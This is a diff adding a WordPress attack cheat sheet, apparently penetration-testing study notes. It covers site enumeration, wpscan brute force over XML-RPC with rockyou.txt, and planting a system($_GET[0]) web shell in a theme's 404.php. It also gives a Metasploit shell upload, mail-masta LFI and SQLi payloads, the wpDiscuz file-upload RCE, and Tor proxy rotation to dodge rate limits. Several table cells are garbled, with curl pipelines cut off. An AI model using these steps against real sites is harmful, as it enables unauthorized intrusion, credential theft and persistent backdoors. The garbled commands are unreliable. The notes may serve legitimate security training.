@@ -1,0 +1,103 @@
+🧠 WordPress Discovery & Enumeration – Summary
+Action	Tool/Command	Outcome
+Check robots.txt	curl blog.site/robots.txt	Reveals wp-admin, wp-content, or other WP dirs
+View Page Source	Browser or `curl -s blog.site	grep WordPress`
+Enumerate Plugins/Themes	`curl	grep plugins/themes`
+Check for Readmes	/wp-content/plugins/<plugin>/readme.txt	Can leak plugin version info
+Enumerate Users	/wp-login.php + error messages OR /?author=1	Identify valid usernames via error messages or author ID fuzzing
+Automated Tool	wpscan with --enumerate and API key	Confirm version, themes, plugins, and users
+✅ If This, Then That: WordPress Enumeration
+If robots.txt or /wp-login.php exists → Then it’s WordPress.
+
+If meta tag includes version → Then cross-check on wpvulndb.com or use wpscan.
+
+If plugins/themes show in page source → Then attempt to enumerate their version with curl or readme.txt.
+
+If directory listing is enabled on /wp-content → Then manually explore or fuzz with ffuf.
+
+If /wp-login.php gives different errors for valid/invalid usernames → Then you can brute force users.
+
+If /xmlrpc.php is accessible → Then use wpscan XML-RPC login method for faster bruteforce.
+
+🛠️ WPScan Cheatsheet (Quick Usage)
+bash
+Copy
+Edit
+wpscan --url http://TARGET --enumerate --api-token YOUR_TOKEN
+wpscan --url http://TARGET --password-attack xmlrpc -U admin -P rockyou.txt -t 20
+💥 Attacking WordPress – Summary
+Attack Type	Prereqs	Action	Effect
+Login Bruteforce	Valid username, xmlrpc.php enabled	wpscan --password-attack xmlrpc	Valid credentials for backend access
+RCE via Theme Editor	Admin creds	Inject system($_GET[0]); in 404.php of inactive theme	Code execution
+Metasploit Shell Upload	Admin creds	wp_admin_shell_upload	Meterpreter shell
+LFI (mail-masta)	Plugin installed	?pl=/etc/passwd	File read
+SQLi (mail-masta)	Plugin installed	POST fuzzing or direct exploitation	Dump credentials
+Unauth RCE (wpDiscuz)	Plugin installed (≤7.0.4)	Upload .php disguised file	Remote shell execution
+✅ If This, Then That: WordPress Attack Paths
+If login page is up and xmlrpc.php exists → Then try wpscan bruteforce with XML-RPC.
+
+If you get admin access → Then go to Theme Editor > Modify 404.php in inactive theme.
+
+If plugins like mail-masta are found → Then try:
+
+LFI: ?pl=/etc/passwd
+
+SQLi: try POST camp_id=1' or 1=1-- if you find a POST form.
+
+If wpDiscuz is version ≤7.0.4 → Then use RCE exploit (upload .php disguised as image).
+
+If no plugin PoCs work → Then search /wp-content/uploads/ or use Wayback Machine to hunt for old plugin dirs.
+
+🔍 Hidden Hints & Patterns
+Plugins often keep readme.txt or changelogs in their root folders.
+
+Themes used can be misidentified if it’s a child theme (like Transport Gravity for Business Gravity).
+
+A plugin that isn’t shown by WPScan might still be exploitable — rely on grep plugins, curl, and manual inspection.
+
+XML-RPC login is often left exposed even when the main login form is rate-limited or protected.
+
+✅ If You Know It's WordPress – Start with This:
+🔍 1. Version Discovery (quick)
+bash
+Copy
+Edit
+curl -s http://target | grep WordPress
+curl -s http://target | grep "wp-content"
+✅ If version found in meta tag — note it. Then skip straight to vuln checking with WPScan.
+
+⚙️ 2. Targeted WPScan (version + plugin + theme)
+bash
+Copy
+Edit
+wpscan --url http://target --enumerate vp,vt,tt,u --api-token <your_token>
+vp: vulnerable plugins
+
+vt: vulnerable themes
+
+tt: all themes
+
+u: users
+
+⏱️ This is your go-to combo. It’s high ROI — gives users, plugin versions, and known vulns.
+
+🎯 3. WPScan Bruteforce (ONLY if xmlrpc.php or /wp-login.php is accessible)
+bash
+Copy
+Edit
+wpscan --url http://target --password-attack xmlrpc -U <user> -P /path/to/wordlist
+Use xmlrpc if available — it’s faster and stealthier than login form
+
+Always verify if usernames exist first (manual or via WPScan --enumerate u)
+
+🧠 Bonus Workflow Tip:
+Situation	Action
+WPScan misses plugins/themes	Use `curl
+You find readme.txt or changelogs	Use it to confirm plugin/theme versions
+Only 1 user is found	Try /?author=1, /?author=2, etc. to enumerate more
+WPScan gets rate-limited	Drop threads -t 1 or use Tor + proxy rotation
+🧨 TL;DR: Should You Start With WPScan?
+✅ Yes — but not blindly.
+Use it as a precision tool, paired with manual greps, to maximize the value:
+
+"Manual confirms existence, WPScan confirms vulnerabilities."
